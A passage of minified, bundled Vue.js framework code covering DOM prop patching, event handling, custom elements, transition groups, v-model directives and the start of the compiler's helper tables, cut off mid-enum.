    r = Sr(r);
    for (let s = 0; s < th.length; s++) {
        const i = th[s] + r;
        if (i in e) return Fl[t] = i
    }
    return t
}
const nh = "http://www.w3.org/1999/xlink";

function rh(e, t, n, r, s, i = Wp(t)) {
    r && t.startsWith("xlink:") ? n == null ? e.removeAttributeNS(nh, t.slice(6, t.length)) : e.setAttributeNS(nh, t, n) : n == null || i && !P0(n) ? e.removeAttribute(t) : e.setAttribute(t, i ? "" : ft(n) ? String(n) : n)
}

function sh(e, t, n, r, s) {
    if (t === "innerHTML" || t === "textContent") {
        n != null && (e[t] = t === "innerHTML" ? O2(n) : n);
        return
    }
    const i = e.tagName;
    if (t === "value" && i !== "PROGRESS" && !i.includes("-")) {
        const a = i === "OPTION" ? e.getAttribute("value") || "" : e.value,
            c = n == null ? e.type === "checkbox" ? "on" : "" : String(n);
        (a !== c || !("_value" in e)) && (e.value = c), n == null && e.removeAttribute(t), e._value = n;
        return
    }
    let o = !1;
    if (n === "" || n == null) {
        const a = typeof e[t];
        a === "boolean" ? n = P0(n) : n == null && a === "string" ? (n = "", o = !0) : a === "number" && (n = 0, o = !0)
    }
    try {
        e[t] = n
    } catch {}
    o && e.removeAttribute(s || t)
}

function Mn(e, t, n, r) {
    e.addEventListener(t, n, r)
}

function yw(e, t, n, r) {
    e.removeEventListener(t, n, r)
}
const ih = Symbol("_vei");

function ww(e, t, n, r, s = null) {
    const i = e[ih] || (e[ih] = {}),
        o = i[t];
    if (r && o) o.value = r;
    else {
        const [a, c] = _w(t);
        if (r) {
            const u = i[t] = Tw(r, s);
            Mn(e, a, u, c)
        } else o && (yw(e, a, o, c), i[t] = void 0)
    }
}
const oh = /(?:Once|Passive|Capture)$/;

function _w(e) {
    let t;
    if (oh.test(e)) {
        t = {};
        let r;
        for (; r = e.match(oh);) e = e.slice(0, e.length - r[0].length), t[r[0].toLowerCase()] = !0
    }
    return [e[2] === ":" ? e.slice(3) : nt(e.slice(2)), t]
}
let Ul = 0;
const Ew = Promise.resolve(),
    vw = () => Ul || (Ew.then(() => Ul = 0), Ul = Date.now());

function Tw(e, t) {
    const n = r => {
        if (!r._vts) r._vts = Date.now();
        else if (r._vts <= n.attached) return;
        jt(Sw(r, n.value), t, 5, [r])
    };
    return n.value = e, n.attached = vw(), n
}

function Sw(e, t) {
    if (K(t)) {
        const n = e.stopImmediatePropagation;
        return e.stopImmediatePropagation = () => {
            n.call(e), e._stopped = !0
        }, t.map(r => s => !s._stopped && r && r(s))
    } else return t
}
const ah = e => e.charCodeAt(0) === 111 && e.charCodeAt(1) === 110 && e.charCodeAt(2) > 96 && e.charCodeAt(2) < 123,
    U2 = (e, t, n, r, s, i) => {
        const o = s === "svg";
        t === "class" ? hw(e, r, o) : t === "style" ? gw(e, n, r) : vr(t) ? Tc(t) || ww(e, t, n, r, i) : (t[0] === "." ? (t = t.slice(1), !0) : t[0] === "^" ? (t = t.slice(1), !1) : Cw(e, t, r, o)) ? (sh(e, t, r), !e.tagName.includes("-") && (t === "value" || t === "checked" || t === "selected") && rh(e, t, r, o, i, t !== "value")) : e._isVueCE && (/[A-Z]/.test(t) || !re(r)) ? sh(e, _e(t), r, i, t) : (t === "true-value" ? e._trueValue = r : t === "false-value" && (e._falseValue = r), rh(e, t, r, o))
    };

function Cw(e, t, n, r) {
    if (r) return !!(t === "innerHTML" || t === "textContent" || t in e && ah(t) && te(n));
    if (t === "spellcheck" || t === "draggable" || t === "translate" || t === "autocorrect" || t === "sandbox" && e.tagName === "IFRAME" || t === "form" || t === "list" && e.tagName === "INPUT" || t === "type" && e.tagName === "TEXTAREA") return !1;
    if (t === "width" || t === "height") {
        const s = e.tagName;
        if (s === "IMG" || s === "VIDEO" || s === "CANVAS" || s === "SOURCE") return !1
    }
    return ah(t) && re(n) ? !1 : t in e
}
const ch = {};

function V2(e, t, n) {
    let r = U0(e, t);
    Ro(r) && (r = ae({}, r, t));
    class s extends Hc {
        constructor(o) {
            super(r, o, n)
        }
    }
    return s.def = r, s
}
const Iw = ((e, t) => V2(e, t, Q2)),
    Aw = typeof HTMLElement < "u" ? HTMLElement : class {};
class Hc extends Aw {
    constructor(t, n = {}, r = tc) {
        super(), this._def = t, this._props = n, this._createApp = r, this._isVueCE = !0, this._instance = null, this._app = null, this._nonce = this._def.nonce, this._connected = !1, this._resolved = !1, this._patching = !1, this._dirty = !1, this._numberProps = null, this._styleChildren = new WeakSet, this._ob = null, this.shadowRoot && r !== tc ? this._root = this.shadowRoot : t.shadowRoot !== !1 ? (this.attachShadow(ae({}, t.shadowRootOptions, {
            mode: "open"
        })), this._root = this.shadowRoot) : this._root = this
    }
    connectedCallback() {
        if (!this.isConnected) return;
        !this.shadowRoot && !this._resolved && this._parseSlots(), this._connected = !0;
        let t = this;
        for (; t = t && (t.parentNode || t.host);)
            if (t instanceof Hc) {
                this._parent = t;
                break
            } this._instance || (this._resolved ? this._mount(this._def) : t && t._pendingResolve ? this._pendingResolve = t._pendingResolve.then(() => {
            this._pendingResolve = void 0, this._resolveDef()
        }) : this._resolveDef())
    }
    _setParent(t = this._parent) {
        t && (this._instance.parent = t._instance, this._inheritParentContext(t))
    }
    _inheritParentContext(t = this._parent) {
        t && this._app && Object.setPrototypeOf(this._app._context.provides, t._instance.provides)
    }
    disconnectedCallback() {
        this._connected = !1, Mc(() => {
            this._connected || (this._ob && (this._ob.disconnect(), this._ob = null), this._app && this._app.unmount(), this._instance && (this._instance.ce = void 0), this._app = this._instance = null, this._teleportTargets && (this._teleportTargets.clear(), this._teleportTargets = void 0))
        })
    }
    _processMutations(t) {
        for (const n of t) this._setAttr(n.attributeName)
    }
    _resolveDef() {
        if (this._pendingResolve) return;
        for (let r = 0; r < this.attributes.length; r++) this._setAttr(this.attributes[r].name);
        this._ob = new MutationObserver(this._processMutations.bind(this)), this._ob.observe(this, {
            attributes: !0
        });
        const t = (r, s = !1) => {
                this._resolved = !0, this._pendingResolve = void 0;
                const {
                    props: i,
                    styles: o
                } = r;
                let a;
                if (i && !K(i))
                    for (const c in i) {
                        const u = i[c];
                        (u === Number || u && u.type === Number) && (c in this._props && (this._props[c] = ji(this._props[c])), (a || (a = Object.create(null)))[_e(c)] = !0)
                    }
                this._numberProps = a, this._resolveProps(r), this.shadowRoot && this._applyStyles(o), this._mount(r)
            },
            n = this._def.__asyncLoader;
        n ? this._pendingResolve = n().then(r => {
            r.configureApp = this._def.configureApp, t(this._def = r, !0)
        }) : t(this._def)
    }
    _mount(t) {
        this._app = this._createApp(t), this._inheritParentContext(), t.configureApp && t.configureApp(this._app), this._app._ceVNode = this._createVNode(), this._app.mount(this._root);
        const n = this._instance && this._instance.exposed;
        if (n)
            for (const r in n) pe(this, r) || Object.defineProperty(this, r, {
                get: () => Do(n[r])
            })
    }
    _resolveProps(t) {
        const {
            props: n
        } = t, r = K(n) ? n : Object.keys(n || {});
        for (const s of Object.keys(this)) s[0] !== "_" && r.includes(s) && this._setProp(s, this[s]);
        for (const s of r.map(_e)) Object.defineProperty(this, s, {
            get() {
                return this._getProp(s)
            },
            set(i) {
                this._setProp(s, i, !0, !this._patching)
            }
        })
    }
    _setAttr(t) {
        if (t.startsWith("data-v-")) return;
        const n = this.hasAttribute(t);
        let r = n ? this.getAttribute(t) : ch;
        const s = _e(t);
        n && this._numberProps && this._numberProps[s] && (r = ji(r)), this._setProp(s, r, !1, !0)
    }
    _getProp(t) {
        return this._props[t]
    }
    _setProp(t, n, r = !0, s = !1) {
        if (n !== this._props[t] && (this._dirty = !0, n === ch ? delete this._props[t] : (this._props[t] = n, t === "key" && this._app && (this._app._ceVNode.key = n)), s && this._instance && this._update(), r)) {
            const i = this._ob;
            i && (this._processMutations(i.takeRecords()), i.disconnect()), n === !0 ? this.setAttribute(nt(t), "") : typeof n == "string" || typeof n == "number" ? this.setAttribute(nt(t), n + "") : n || this.removeAttribute(nt(t)), i && i.observe(this, {
                attributes: !0
            })
        }
    }
    _update() {
        const t = this._createVNode();
        this._app && (t.appContext = this._app._context), J2(t, this._root)
    }
    _createVNode() {
        const t = {};
        this.shadowRoot || (t.onVnodeMounted = t.onVnodeUpdated = this._renderSlots.bind(this));
        const n = Te(this._def, ae(t, this._props));
        return this._instance || (n.ce = r => {
            this._instance = r, r.ce = this, r.isCE = !0;
            const s = (i, o) => {
                this.dispatchEvent(new CustomEvent(i, Ro(o[0]) ? ae({
                    detail: o
                }, o[0]) : {
                    detail: o
                }))
            };
            r.emit = (i, ...o) => {
                s(i, o), nt(i) !== i && s(nt(i), o)
            }, this._setParent()
        }), n
    }
    _applyStyles(t, n) {
        if (!t) return;
        if (n) {
            if (n === this._def || this._styleChildren.has(n)) return;
            this._styleChildren.add(n)
        }
        const r = this._nonce;
        for (let s = t.length - 1; s >= 0; s--) {
            const i = document.createElement("style");
            r && i.setAttribute("nonce", r), i.textContent = t[s], this.shadowRoot.prepend(i)
        }
    }
    _parseSlots() {
        const t = this._slots = {};
        let n;
        for (; n = this.firstChild;) {
            const r = n.nodeType === 1 && n.getAttribute("slot") || "default";
            (t[r] || (t[r] = [])).push(n), this.removeChild(n)
        }
    }
    _renderSlots() {
        const t = this._getSlots(),
            n = this._instance.type.__scopeId;
        for (let r = 0; r < t.length; r++) {
            const s = t[r],
                i = s.getAttribute("name") || "default",
                o = this._slots[i],
                a = s.parentNode;
            if (o)
                for (const c of o) {
                    if (n && c.nodeType === 1) {
                        const u = n + "-s",
                            l = document.createTreeWalker(c, 1);
                        c.setAttribute(u, "");
                        let f;
                        for (; f = l.nextNode();) f.setAttribute(u, "")
                    }
                    a.insertBefore(c, s)
                } else
                    for (; s.firstChild;) a.insertBefore(s.firstChild, s);
            a.removeChild(s)
        }
    }
    _getSlots() {
        const t = [this];
        this._teleportTargets && t.push(...this._teleportTargets);
        const n = new Set;
        for (const r of t) {
            const s = r.querySelectorAll("slot");
            for (let i = 0; i < s.length; i++) n.add(s[i])
        }
        return Array.from(n)
    }
    _injectChildStyle(t) {
        this._applyStyles(t.styles, t)
    }
    _beginPatch() {
        this._patching = !0, this._dirty = !1
    }
    _endPatch() {
        this._patching = !1, this._dirty && this._instance && this._update()
    }
    _removeChildStyle(t) {}
}

function H2(e) {
    const t = vt(),
        n = t && t.ce;
    return n || null
}

function Nw() {
    const e = H2();
    return e && e.shadowRoot
}

function Pw(e = "$style") {
    {
        const t = vt();
        if (!t) return ue;
        const n = t.type.__cssModules;
        if (!n) return ue;
        const r = n[e];
        return r || ue
    }
}
const j2 = new WeakMap,
    z2 = new WeakMap,
    ec = Symbol("_moveCb"),
    lh = Symbol("_enterCb"),
    Ow = e => (delete e.props.mode, e),
    Rw = Ow({
        name: "TransitionGroup",
        props: ae({}, k2, {
            tag: String,
            moveClass: String
        }),
        setup(e, {
            slots: t
        }) {
            const n = vt(),
                r = D0();
            let s, i;
            return $c(() => {
                if (!s.length) return;
                const o = e.moveClass || `${e.name||"v"}-move`;
                if (!$w(s[0].el, n.vnode.el, o)) {
                    s = [];
                    return
                }
                s.forEach(kw), s.forEach(Bw);
                const a = s.filter(Lw);
                Ru(n.vnode.el), a.forEach(c => {
                    const u = c.el,
                        l = u.style;
                    ln(u, o), l.transform = l.webkitTransform = l.transitionDuration = "";
                    const f = u[ec] = d => {
                        d && d.target !== u || (!d || d.propertyName.endsWith("transform")) && (u.removeEventListener("transitionend", f), u[ec] = null, ar(u, o))
                    };
                    u.addEventListener("transitionend", f)
                }), s = []
            }), () => {
                const o = he(e),
                    a = B2(o);
                let c = o.tag || Ne;
                if (s = [], i)
                    for (let u = 0; u < i.length; u++) {
                        const l = i[u];
                        l.el && l.el instanceof Element && (s.push(l), qn(l, Us(l, a, r, n)), j2.set(l, {
                            left: l.el.offsetLeft,
                            top: l.el.offsetTop
                        }))
                    }
                i = t.default ? Bc(t.default()) : [];
                for (let u = 0; u < i.length; u++) {
                    const l = i[u];
                    l.key != null && qn(l, Us(l, a, r, n))
                }
                return Te(c, null, i)
            }
        }
    }),
    Mw = Rw;

function kw(e) {
    const t = e.el;
    t[ec] && t[ec](), t[lh] && t[lh]()
}

function Bw(e) {
    z2.set(e, {
        left: e.el.offsetLeft,
        top: e.el.offsetTop
    })
}

function Lw(e) {
    const t = j2.get(e),
        n = z2.get(e),
        r = t.left - n.left,
        s = t.top - n.top;
    if (r || s) {
        const i = e.el.style;
        return i.transform = i.webkitTransform = `translate(${r}px,${s}px)`, i.transitionDuration = "0s", e
    }
}

function $w(e, t, n) {
    const r = e.cloneNode(),
        s = e[Hs];
    s && s.forEach(a => {
        a.split(/\s+/).forEach(c => c && r.classList.remove(c))
    }), n.split(/\s+/).forEach(a => a && r.classList.add(a)), r.style.display = "none";
    const i = t.nodeType === 1 ? t : t.parentNode;
    i.appendChild(r);
    const {
        hasTransform: o
    } = L2(r);
    return i.removeChild(r), o
}
const yr = e => {
    const t = e.props["onUpdate:modelValue"] || !1;
    return K(t) ? n => zr(t, n) : t
};

function Dw(e) {
    e.target.composing = !0
}

function uh(e) {
    const t = e.target;
    t.composing && (t.composing = !1, t.dispatchEvent(new Event("input")))
}
const Vt = Symbol("_assign");

function fh(e, t, n) {
    return t && (e = e.trim()), n && (e = ko(e)), e
}
const Qi = {
        created(e, {
            modifiers: {
                lazy: t,
                trim: n,
                number: r
            }
        }, s) {
            e[Vt] = yr(s);
            const i = r || s.props && s.props.type === "number";
            Mn(e, t ? "change" : "input", o => {
                o.target.composing || e[Vt](fh(e.value, n, i))
            }), (n || i) && Mn(e, "change", () => {
                e.value = fh(e.value, n, i)
            }), t || (Mn(e, "compositionstart", Dw), Mn(e, "compositionend", uh), Mn(e, "change", uh))
        },
        mounted(e, {
            value: t
        }) {
            e.value = t ?? ""
        },
        beforeUpdate(e, {
            value: t,
            oldValue: n,
            modifiers: {
                lazy: r,
                trim: s,
                number: i
            }
        }, o) {
            if (e[Vt] = yr(o), e.composing) return;
            const a = (i || e.type === "number") && !/^0\d/.test(e.value) ? ko(e.value) : e.value,
                c = t ?? "";
            a !== c && (document.activeElement === e && e.type !== "range" && (r && t === n || s && e.value.trim() === c) || (e.value = c))
        }
    },
    Y0 = {
        deep: !0,
        created(e, t, n) {
            e[Vt] = yr(n), Mn(e, "change", () => {
                const r = e._modelValue,
                    s = js(e),
                    i = e.checked,
                    o = e[Vt];
                if (K(r)) {
                    const a = Lo(r, s),
                        c = a !== -1;
                    if (i && !c) o(r.concat(s));
                    else if (!i && c) {
                        const u = [...r];
                        u.splice(a, 1), o(u)
                    }
                } else if (Tr(r)) {
                    const a = new Set(r);
                    i ? a.add(s) : a.delete(s), o(a)
                } else o(G2(e, i))
            })
        },
        mounted: dh,
        beforeUpdate(e, t, n) {
            e[Vt] = yr(n), dh(e, t, n)
        }
    };

function dh(e, {
    value: t,
    oldValue: n
}, r) {
    e._modelValue = t;
    let s;
    if (K(t)) s = Lo(t, r.props.value) > -1;
    else if (Tr(t)) s = t.has(r.props.value);
    else {
        if (t === n) return;
        s = Hn(t, G2(e, !0))
    }
    e.checked !== s && (e.checked = s)
}
const J0 = {
        created(e, {
            value: t
        }, n) {
            e.checked = Hn(t, n.props.value), e[Vt] = yr(n), Mn(e, "change", () => {
                e[Vt](js(e))
            })
        },
        beforeUpdate(e, {
            value: t,
            oldValue: n
        }, r) {
            e[Vt] = yr(r), t !== n && (e.checked = Hn(t, r.props.value))
        }
    },
    q2 = {
        deep: !0,
        created(e, {
            value: t,
            modifiers: {
                number: n
            }
        }, r) {
            const s = Tr(t);
            Mn(e, "change", () => {
                const i = Array.prototype.filter.call(e.options, o => o.selected).map(o => n ? ko(js(o)) : js(o));
                e[Vt](e.multiple ? s ? new Set(i) : i : i[0]), e._assigning = !0, Mc(() => {
                    e._assigning = !1
                })
            }), e[Vt] = yr(r)
        },
        mounted(e, {
            value: t
        }) {
            hh(e, t)
        },
        beforeUpdate(e, t, n) {
            e[Vt] = yr(n)
        },
        updated(e, {
            value: t
        }) {
            e._assigning || hh(e, t)
        }
    };

function hh(e, t) {
    const n = e.multiple,
        r = K(t);
    if (!(n && !r && !Tr(t))) {
        for (let s = 0, i = e.options.length; s < i; s++) {
            const o = e.options[s],
                a = js(o);
            if (n)
                if (r) {
                    const c = typeof a;
                    c === "string" || c === "number" ? o.selected = t.some(u => String(u) === String(a)) : o.selected = Lo(t, a) > -1
                } else o.selected = t.has(a);
            else if (Hn(js(o), t)) {
                e.selectedIndex !== s && (e.selectedIndex = s);
                return
            }
        }!n && e.selectedIndex !== -1 && (e.selectedIndex = -1)
    }
}

function js(e) {
    return "_value" in e ? e._value : e.value
}

function G2(e, t) {
    const n = t ? "_trueValue" : "_falseValue";
    return n in e ? e[n] : t
}
const W2 = {
    created(e, t, n) {
        ga(e, t, n, null, "created")
    },
    mounted(e, t, n) {
        ga(e, t, n, null, "mounted")
    },
    beforeUpdate(e, t, n, r) {
        ga(e, t, n, r, "beforeUpdate")
    },
    updated(e, t, n, r) {
        ga(e, t, n, r, "updated")
    }
};

function X2(e, t) {
    switch (e) {
        case "SELECT":
            return q2;
        case "TEXTAREA":
            return Qi;
        default:
            switch (t) {
                case "checkbox":
                    return Y0;
                case "radio":
                    return J0;
                default:
                    return Qi
            }
    }
}

function ga(e, t, n, r, s) {
    const o = X2(e.tagName, n.props && n.props.type)[s];
    o && o(e, t, n, r)
}

function Fw() {
    Qi.getSSRProps = ({
        value: e
    }) => ({
        value: e
    }), J0.getSSRProps = ({
        value: e
    }, t) => {
        if (t.props && Hn(t.props.value, e)) return {
            checked: !0
        }
    }, Y0.getSSRProps = ({
        value: e
    }, t) => {
        if (K(e)) {
            if (t.props && Lo(e, t.props.value) > -1) return {
                checked: !0
            }
        } else if (Tr(e)) {
            if (t.props && e.has(t.props.value)) return {
                checked: !0
            }
        } else if (e) return {
            checked: !0
        }
    }, W2.getSSRProps = (e, t) => {
        if (typeof t.type != "string") return;
        const n = X2(t.type.toUpperCase(), t.props && t.props.type);
        if (n.getSSRProps) return n.getSSRProps(e, t)
    }
}
const Uw = ["ctrl", "shift", "alt", "meta"],
    Vw = {
        stop: e => e.stopPropagation(),
        prevent: e => e.preventDefault(),
        self: e => e.target !== e.currentTarget,
        ctrl: e => !e.ctrlKey,
        shift: e => !e.shiftKey,
        alt: e => !e.altKey,
        meta: e => !e.metaKey,
        left: e => "button" in e && e.button !== 0,
        middle: e => "button" in e && e.button !== 1,
        right: e => "button" in e && e.button !== 2,
        exact: (e, t) => Uw.some(n => e[`${n}Key`] && !t.includes(n))
    },
    Hw = (e, t) => {
        const n = e._withMods || (e._withMods = {}),
            r = t.join(".");
        return n[r] || (n[r] = ((s, ...i) => {
            for (let o = 0; o < t.length; o++) {
                const a = Vw[t[o]];
                if (a && a(s, t)) return
            }
            return e(s, ...i)
        }))
    },
    jw = {
        esc: "escape",
        space: " ",
        up: "arrow-up",
        left: "arrow-left",
        right: "arrow-right",
        down: "arrow-down",
        delete: "backspace"
    },
    zw = (e, t) => {
        const n = e._withKeys || (e._withKeys = {}),
            r = t.join(".");
        return n[r] || (n[r] = (s => {
            if (!("key" in s)) return;
            const i = nt(s.key);
            if (t.some(o => o === i || jw[o] === i)) return e(s)
        }))
    },
    K2 = ae({
        patchProp: U2
    }, R2);
let Vi, ph = !1;

function Z2() {
    return Vi || (Vi = c2(K2))
}

function Y2() {
    return Vi = ph ? Vi : l2(K2), ph = !0, Vi
}
const J2 = ((...e) => {
        Z2().render(...e)
    }),
    qw = ((...e) => {
        Y2().hydrate(...e)
    }),
    tc = ((...e) => {
        const t = Z2().createApp(...e),
            {
                mount: n
            } = t;
        return t.mount = r => {
            const s = tm(r);
            if (!s) return;
            const i = t._component;
            !te(i) && !i.render && !i.template && (i.template = s.innerHTML), s.nodeType === 1 && (s.textContent = "");
            const o = n(s, !1, em(s));
            return s instanceof Element && (s.removeAttribute("v-cloak"), s.setAttribute("data-v-app", "")), o
        }, t
    }),
    Q2 = ((...e) => {
        const t = Y2().createApp(...e),
            {
                mount: n
            } = t;
        return t.mount = r => {
            const s = tm(r);
            if (s) return n(s, !0, em(s))
        }, t
    });

function em(e) {
    if (e instanceof SVGElement) return "svg";
    if (typeof MathMLElement == "function" && e instanceof MathMLElement) return "mathml"
}

function tm(e) {
    return re(e) ? document.querySelector(e) : e
}
let mh = !1;
const Gw = () => {
        mh || (mh = !0, Fw(), pw())
    },
    Ww = Object.freeze(Object.defineProperty({
        __proto__: null,
        BaseTransition: R1,
        BaseTransitionPropsValidators: F0,
        Comment: Pe,
        DeprecationTypes: ow,
        EffectScope: O0,
        ErrorCodes: m5,
        ErrorTypeStrings: Q6,
        Fragment: Ne,
        KeepAlive: V5,
        ReactiveEffect: zi,
        Static: Wr,
        Suspense: B6,
        Teleport: v5,
        Text: mr,
        TrackOpTypes: c5,
        Transition: uw,
        TransitionGroup: Mw,
        TriggerOpTypes: l5,
        VueElement: Hc,
        assertNumber: p5,
        callWithAsyncErrorHandling: jt,
        callWithErrorHandling: oi,
        camelize: _e,
        capitalize: Sr,
        cloneVNode: mn,
        compatUtils: iw,
        computed: I2,
        createApp: tc,
        createBlock: Ka,
        createCommentVNode: w2,
        createElementBlock: pt,
        createElementVNode: z,
        createHydrationRenderer: l2,
        createPropsRestProxy: a6,
        createRenderer: c2,
        createSSRApp: Q2,
        createSlots: G5,
        createStaticVNode: y2,
        createTextVNode: Nn,
        createVNode: Te,
        customRef: x1,
        defineAsyncComponent: F5,
        defineComponent: U0,
        defineCustomElement: V2,
        defineEmits: Y5,
        defineExpose: J5,
        defineModel: t6,
        defineOptions: Q5,
        defineProps: Z5,
        defineSSRCustomElement: Iw,
        defineSlots: e6,
        devtools: ew,
        effect: Py,
        effectScope: Iy,
        getCurrentInstance: vt,
        getCurrentScope: Jp,
        getCurrentWatcher: u5,
        getTransitionRawChildren: Bc,
        guardReactiveProps: x2,
        h: A2,
        handleError: ds,
        hasInjectionContext: b6,
        hydrate: qw,
        hydrateOnIdle: M5,
        hydrateOnInteraction: $5,
        hydrateOnMediaQuery: L5,
        hydrateOnVisible: B5,
        initCustomFormatter: Z6,
        initDirectivesForSSR: Gw,
        inject: Fi,
        isMemoSame: N2,
        isProxy: $o,
        isReactive: Ln,
        isReadonly: pn,
        isRef: ke,
        isRuntimeOnly: W6,
        isShallow: _t,
        isVNode: Gn,
        markRaw: m1,
        mergeDefaults: i6,
        mergeModels: o6,
        mergeProps: _2,
        nextTick: Mc,
        nodeOps: R2,
        normalizeClass: fs,
        normalizeProps: Vp,
        normalizeStyle: ii,
        onActivated: k1,
        onBeforeMount: $1,
        onBeforeUnmount: Dc,
        onBeforeUpdate: H0,
        onDeactivated: B1,
        onErrorCaptured: V1,
        onMounted: Uo,
        onRenderTracked: U1,
        onRenderTriggered: F1,
        onScopeDispose: Ay,
        onServerPrefetch: D1,
        onUnmounted: Fc,
        onUpdated: $c,
        onWatcherCleanup: w1,
        openBlock: Ue,
        patchProp: U2,
        popScopeId: w5,
        provide: W1,
        proxyRefs: B0,
        pushScopeId: y5,
        queuePostFlushCb: Wi,
        reactive: Oc,
        readonly: Va,
        ref: Li,
        registerRuntimeCompiler: G6,
        render: J2,
        renderList: Ia,
        renderSlot: W5,
        resolveComponent: z5,
        resolveDirective: j1,
        resolveDynamicComponent: q5,
        resolveFilter: sw,
        resolveTransitionHooks: Us,
        setBlockTracking: Ji,
        setDevtoolsHook: tw,
        setTransitionHooks: qn,
        shallowReactive: p1,
        shallowReadonly: Zy,
        shallowRef: b1,
        ssrContextKey: X1,
        ssrUtils: rw,
        stop: Oy,
        toDisplayString: Fe,
        toHandlerKey: jr,
        toHandlers: X5,
        toRaw: he,
        toRef: i5,
        toRefs: n5,
        toValue: Qy,
        transformVNodeArgs: V6,
        triggerRef: Jy,
        unref: Do,
        useAttrs: s6,
        useCssModule: Pw,
        useCssVars: mw,
        useHost: H2,
        useId: S5,
        useModel: w6,
        useSSRContext: K1,
        useShadowRoot: Nw,
        useSlots: r6,
        useTemplateRef: C5,
        useTransitionState: D0,
        vModelCheckbox: Y0,
        vModelDynamic: W2,
        vModelRadio: J0,
        vModelSelect: q2,
        vModelText: Qi,
        vShow: D2,
        version: P2,
        warn: J6,
        watch: Rs,
        watchEffect: g6,
        watchPostEffect: x6,
        watchSyncEffect: Z1,
        withAsyncContext: c6,
        withCtx: $0,
        withDefaults: n6,
        withDirectives: Pi,
        withKeys: zw,
        withMemo: Y6,
        withModifiers: Hw,
        withScopeId: _5
    }, Symbol.toStringTag, {
        value: "Module"
    }));

function nm(e) {
    return e && e.__esModule && Object.prototype.hasOwnProperty.call(e, "default") ? e.default : e
}

function Q0(e) {
    if (Object.prototype.hasOwnProperty.call(e, "__esModule")) return e;
    var t = e.default;
    if (typeof t == "function") {
        var n = function r() {
            var s = !1;
            try {
                s = this instanceof r
            } catch {}
            return s ? Reflect.construct(t, arguments, this.constructor) : t.apply(this, arguments)
        };
        n.prototype = t.prototype
    } else n = {};
    return Object.defineProperty(n, "__esModule", {
        value: !0
    }), Object.keys(e).forEach(function(r) {
        var s = Object.getOwnPropertyDescriptor(e, r);
        Object.defineProperty(n, r, s.get ? s : {
            enumerable: !0,
            get: function() {
                return e[r]
            }
        })
    }), n
}
var Oa = {
        exports: {}
    },
    Vl = {
        exports: {}
    },
    Hl = {};
const zs = Symbol(""),
    ks = Symbol(""),
    jc = Symbol(""),
    eo = Symbol(""),
    ef = Symbol(""),
    wr = Symbol(""),
    tf = Symbol(""),
    nf = Symbol(""),
    zc = Symbol(""),
    qc = Symbol(""),
    ai = Symbol(""),
    Gc = Symbol(""),
    rf = Symbol(""),
    Wc = Symbol(""),
    Xc = Symbol(""),
    Kc = Symbol(""),
    Zc = Symbol(""),
    Yc = Symbol(""),
    Jc = Symbol(""),
    sf = Symbol(""),
    of = Symbol(""),
    jo = Symbol(""),
    to = Symbol(""),
    Qc = Symbol(""),
    el = Symbol(""),
    qs = Symbol(""),
    ci = Symbol(""),
    tl = Symbol(""),
    nc = Symbol(""),
    rm = Symbol(""),
    rc = Symbol(""),
    no = Symbol(""),
    sm = Symbol(""),
    im = Symbol(""),
    nl = Symbol(""),
    om = Symbol(""),
    am = Symbol(""),
    rl = Symbol(""),
    af = Symbol(""),
    es = {
        [zs]: "Fragment",
        [ks]: "Teleport",
        [jc]: "Suspense",
        [eo]: "KeepAlive",
        [ef]: "BaseTransition",
        [wr]: "openBlock",
        [tf]: "createBlock",
        [nf]: "createElementBlock",
        [zc]: "createVNode",
        [qc]: "createElementVNode",
        [ai]: "createCommentVNode",
        [Gc]: "createTextVNode",
        [rf]: "createStaticVNode",
        [Wc]: "resolveComponent",
        [Xc]: "resolveDynamicComponent",
        [Kc]: "resolveDirective",
        [Zc]: "resolveFilter",
        [Yc]: "withDirectives",
        [Jc]: "renderList",
        [sf]: "renderSlot",
        [of]: "createSlots",
        [jo]: "toDisplayString",
        [to]: "mergeProps",
        [Qc]: "normalizeClass",
        [el]: "normalizeStyle",
        [qs]: "normalizeProps",
        [ci]: "guardReactiveProps",
        [tl]: "toHandlers",
        [nc]: "camelize",
        [rm]: "capitalize",
        [rc]: "toHandlerKey",
        [no]: "setBlockTracking",
        [sm]: "pushScopeId",
        [im]: "popScopeId",
        [nl]: "withCtx",
        [om]: "unref",
        [am]: "isRef",
        [rl]: "withMemo",
        [af]: "isMemoSame"
    };

function cm(e) {
    Object.getOwnPropertySymbols(e).forEach(t => {
        es[t] = e[t]
    })
}
const Xw = {
        HTML: 0,
        0: "HTML",
        SVG: 1,
        1: "SVG",
        MATH_ML: 2,
        2: "MATH_ML"
    },
    Kw = {
        ROOT: 0,
        0: "ROOT",
        ELEMENT: 1,
        1: "ELEMENT",
        TEXT: 2,
        2: "TEXT",
        COMMENT: 3,
        3: "COMMENT",
        SIMPLE_EXPRESSION: 4,
        4: "SIMPLE_EXPRESSION",
        INTERPOLATION: 5,
        5: "INTERPOLATION",
        ATTRIBUTE: 6,
        6: "ATTRIBUTE",
        DIRECTIVE: 7,
        7: "DIRECTIVE",
        COMPOUND_EXPRESSION: 8,
        8: "COMPOUND_EXPRESSION",
        IF: 9,
        9: "IF",
        IF_BRANCH: 10,
        10: "IF_BRANCH",
        FOR: 11,
        11: "FOR",
        TEXT_CALL: 12,
        12: "TEXT_CALL",
        VNODE_CALL: 13,
        13: "VNODE_CALL",
        JS_CALL_EXPRESSION: 14,
        14: "JS_CALL_EXPRESSION",
        JS_OBJECT_EXPRESSION: 15,
        15: "JS_OBJECT_EXPRESSION",
        JS_PROPERTY: 16,
        16: "JS_PROPERTY",
        JS_ARRAY_EXPRESSION: 17,
        17: "JS_ARRAY_EXPRESSION",
        JS_FUNCTION_EXPRESSION: 18,
        18: "JS_FUNCTION_EXPRESSION",
        JS_CONDITIONAL_EXPRESSION: 19,
        19: "JS_CONDITIONAL_EXPRESSION",
        JS_CACHE_EXPRESSION: 20,
        20: "JS_CACHE_EXPRESSION",
        JS_BLOCK_STATEMENT: 21,
        21: "JS_BLOCK_STATEMENT",
        JS_TEMPLATE_LITERAL: 22,
        22: "JS_TEMPLATE_LITERAL",
        JS_IF_STATEMENT: 23,
        23: "JS_IF_STATEMENT",
        JS_ASSIGNMENT_EXPRESSION: 24,
        24: "JS_ASSIGNMENT_EXPRESSION",
        JS_SEQUENCE_EXPRESSION: 25,
        25: "JS_SEQUENCE_EXPRESSION",
        JS_RETURN_STATEMENT: 26,
        26: "JS_RETURN_STATEMENT"
    },
    Zw = {
        ELEMENT: 0,
        0: "ELEMENT",
        COMPONENT: 1,
        1: "COMPONENT",
        SLOT: 2,
        2: "SLOT",
        TEMPLATE: 3,
        3: "TEMPLATE"
    },
    Yw = {
        NOT_CONSTANT: 0,
        0: "NOT_CONSTANT",
        CAN_SKIP_PATCH: 1,
